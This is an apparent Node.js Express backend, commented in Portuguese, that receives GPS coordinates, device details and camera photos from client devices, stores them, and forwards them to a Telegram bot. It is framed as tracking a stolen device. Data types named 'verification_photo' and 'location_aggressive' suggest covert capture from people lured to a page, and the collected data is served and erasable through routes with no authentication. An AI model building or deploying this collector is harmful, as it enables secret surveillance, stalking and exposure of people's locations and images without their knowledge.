const express = require('express');
const fs = require('fs');
const path = require('path');
const fetch = require('node-fetch');
const app = express();
const port = process.env.PORT || 3000;

app.use(express.json({ limit: '50mb' }));
app.use(express.static('public'));

// Configuração do Telegram - PEGA DAS VARIÁVEIS DE AMBIENTE
const BOT_TOKEN = process.env.BOT_TOKEN;
const CHAT_ID = process.env.CHAT_ID;

console.log('🤖 Configuração Telegram:');
console.log('   BOT_TOKEN:', BOT_TOKEN ? '✅ Configurado' : '❌ Não configurado');
console.log('   CHAT_ID:', CHAT_ID ? '✅ Configurado' : '❌ Não configurado');

// Banco de dados simples
const DB_FILE = 'database.json';

function readDB() {
    try {
        return JSON.parse(fs.readFileSync(DB_FILE, 'utf8'));
    } catch {
        return { locations: [], devices: [] };
    }
}

function saveDB(data) {
    fs.writeFileSync(DB_FILE, JSON.stringify(data, null, 2));
}

// FUNÇÃO PARA ENVIAR MENSAGEM PARA TELEGRAM
async function sendToTelegram(message, photoBase64 = null) {
    if (!BOT_TOKEN || !CHAT_ID) {
        console.log('❌ Telegram não configurado - BOT_TOKEN ou CHAT_ID faltando');
        return false;
    }

    try {
        if (photoBase64 && photoBase64.length > 1000) {
            // Enviar foto (apenas se a foto for grande o suficiente)
            const photoData = photoBase64.replace(/^data:image\/[a-z]+;base64,/, "");
            
            const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    chat_id: CHAT_ID,
                    photo: photoBase64,
                    caption: message,
                    parse_mode: 'HTML'
                })
            });
            
            const result = await response.json();
            if (!result.ok) {
                console.log('❌ Erro ao enviar foto para Telegram:', result.description);
                // Tenta enviar apenas a mensagem
                await sendToTelegram(message);
            } else {
                console.log('✅ Foto enviada para Telegram');
            }
        } else {
            // Enviar apenas mensagem de texto
            const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    chat_id: CHAT_ID,
                    text: message,
                    parse_mode: 'HTML'
                })
            });
            
            const result = await response.json();
            if (!result.ok) {
                console.log('❌ Erro ao enviar mensagem para Telegram:', result.description);
                return false;
            } else {
                console.log('✅ Mensagem enviada para Telegram');
                return true;
            }
        }
    } catch (error) {
        console.error('❌ Erro ao enviar para Telegram:', error.message);
        return false;
    }
}

// FORMATAR MENSAGENS PARA TELEGRAM
function formatLocationMessage(data) {
    const mapsUrl = `https://maps.google.com/?q=${data.location.lat},${data.location.lng}`;
    const accuracy = data.location.accuracy ? data.location.accuracy.toFixed(2) + 'm' : 'N/A';
    const speed = data.location.speed ? (data.location.speed * 3.6).toFixed(1) + ' km/h' : 'N/A';
    
    return `🚨 <b>NOVA LOCALIZAÇÃO - DISPOSITIVO FURTADO</b>\n\n` +
           `📱 <b>ID do Dispositivo:</b> <code>${data.deviceId}</code>\n` +
           `📍 <b>Coordenadas:</b> ${data.location.lat.toFixed(6)}, ${data.location.lng.toFixed(6)}\n` +
           `🎯 <b>Precisão:</b> ${accuracy}\n` +
           `🏔️ <b>Altitude:</b> ${data.location.altitude ? data.location.altitude.toFixed(2) + 'm' : 'N/A'}\n` +
           `🎪 <b>Velocidade:</b> ${speed}\n` +
           `🕒 <b>Horário:</b> ${new Date(data.timestamp).toLocaleString('pt-BR')}\n` +
           `📡 <b>Tipo:</b> ${data.type || 'localização'}\n\n` +
           `🔗 <a href="${mapsUrl}">Ver no Google Maps</a>`;
}

function formatPhotoMessage(data) {
    return `📸 <b>FOTO CAPTURADA - DISPOSITIVO FURTADO</b>\n\n` +
           `📱 <b>ID do Dispositivo:</b> <code>${data.deviceId}</code>\n` +
           `🕒 <b>Horário:</b> ${new Date(data.timestamp).toLocaleString('pt-BR')}\n` +
           `📊 <b>Resolução:</b> ${data.resolution || 'Alta'}\n` +
           `💾 <b>Tamanho:</b> ${data.photo ? Math.round(data.photo.length / 1024) + 'KB' : 'N/A'}`;
}

function formatDeviceMessage(data) {
    return `📱 <b>NOVO DISPOSITIVO CONECTADO</b>\n\n` +
           `🆔 <b>ID:</b> <code>${data.deviceId}</code>\n` +
           `💻 <b>Plataforma:</b> ${data.info.platform}\n` +
           `🌐 <b>Navegador:</b> ${data.info.userAgent.split(' ').slice(-2).join(' ')}\n` +
           `🖥️ <b>Tela:</b> ${data.info.screen}\n` +
           `🏠 <b>Fuso Horário:</b> ${data.info.timezone}\n` +
           `🕒 <b>Primeira Conexão:</b> ${new Date(data.timestamp).toLocaleString('pt-BR')}`;
}

// Rota principal para receber dados
app.post('/track', async (req, res) => {
    const data = req.body;
    console.log('📨 Dados recebidos:', data.type, data.deviceId);
    
    // Salvar no banco de dados local
    const db = readDB();
    data.timestamp = new Date().toISOString();
    data.id = Date.now() + Math.random().toString(36).substr(2, 5);
    
    db.locations.push(data);
    
    // Atualizar/registrar dispositivo
    const deviceIndex = db.devices.findIndex(d => d.deviceId === data.deviceId);
    if (deviceIndex === -1) {
        db.devices.push({
            deviceId: data.deviceId,
            firstSeen: data.timestamp,
            lastSeen: data.timestamp,
            locations: [data],
            status: 'online',
            userAgent: data.deviceInfo?.userAgent || data.info?.userAgent
        });
    } else {
        db.devices[deviceIndex].lastSeen = data.timestamp;
        db.devices[deviceIndex].locations.push(data);
    }
    
    saveDB(db);
    
    // ENVIAR PARA TELEGRAM BASEADO NO TIPO DE DADO
    try {
        let telegramMessage = '';
        let photoBase64 = null;
        
        switch(data.type) {
            case 'verification_location':
            case 'high_accuracy_location':
            case 'continuous_location':
            case 'continuous_tracking':
            case 'location_aggressive':
                telegramMessage = formatLocationMessage(data);
                await sendToTelegram(telegramMessage);
                break;
                
            case 'verification_photo':
            case 'high_quality_photo':
            case 'continuous_photo':
            case 'camera_photo':
                telegramMessage = formatPhotoMessage(data);
                photoBase64 = data.photo;
                await sendToTelegram(telegramMessage, photoBase64);
                break;
                
            case 'device_verification':
            case 'device_analysis':
            case 'device_info':
                telegramMessage = formatDeviceMessage(data);
                await sendToTelegram(telegramMessage);
                break;
                
            case 'network_info':
                // Não enviar network info para não floodar
                break;
                
            case 'heartbeat':
                // Não enviar heartbeats
                console.log('💓 Heartbeat:', data.deviceId);
                break;
                
            default:
                telegramMessage = `📡 <b>NOVOS DADOS RECEBIDOS</b>\n\n` +
                                 `📱 <b>Dispositivo:</b> ${data.deviceId}\n` +
                                 `📊 <b>Tipo:</b> ${data.type}\n` +
                                 `🕒 <b>Horário:</b> ${new Date(data.timestamp).toLocaleString('pt-BR')}`;
                await sendToTelegram(telegramMessage);
        }
        
    } catch (error) {
        console.error('❌ Erro ao processar dados para Telegram:', error);
    }
    
    res.json({ status: 'success', received: true, telegram: 'sent' });
});

// Dashboard - para visualizar dados
app.get('/dashboard', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'dashboard.html'));
});

// API para pegar dados
app.get('/api/data', (req, res) => {
    res.json(readDB());
});

// Rota para limpar dados
app.delete('/api/clear', (req, res) => {
    saveDB({ locations: [], devices: [] });
    res.json({ status: 'cleared' });
});

// Rota de teste do Telegram
app.get('/test-telegram', async (req, res) => {
    const testMessage = `🧪 <b>TESTE DO SISTEMA TELEGRAM</b>\n\n` +
                       `✅ Servidor funcionando corretamente\n` +
                       `🕒 Horário: ${new Date().toLocaleString('pt-BR')}\n` +
                       `🌐 URL: ${req.headers.host}`;
    
    const success = await sendToTelegram(testMessage);
    
    res.json({
        telegram_test: success ? '✅ Mensagem enviada' : '❌ Falha no envio',
        bot_token: BOT_TOKEN ? '✅ Configurado' : '❌ Faltando',
        chat_id: CHAT_ID ? '✅ Configurado' : '❌ Faltando',
        timestamp: new Date().toISOString()
    });
});

// Health check
app.get('/health', (req, res) => {
    res.json({ 
        status: 'online', 
        telegram: BOT_TOKEN && CHAT_ID ? 'configured' : 'not_configured',
        timestamp: new Date().toISOString() 
    });
});

app.listen(port, () => {
    console.log(`🚀 Sistema rodando na porta: ${port}`);
    console.log(`🤖 Telegram: ${BOT_TOKEN && CHAT_ID ? '✅ CONFIGURADO' : '❌ NÃO CONFIGURADO'}`);
    console.log(`📊 Dashboard: http://localhost:${port}/dashboard`);
    console.log(`🧪 Teste Telegram: http://localhost:${port}/test-telegram`);
});
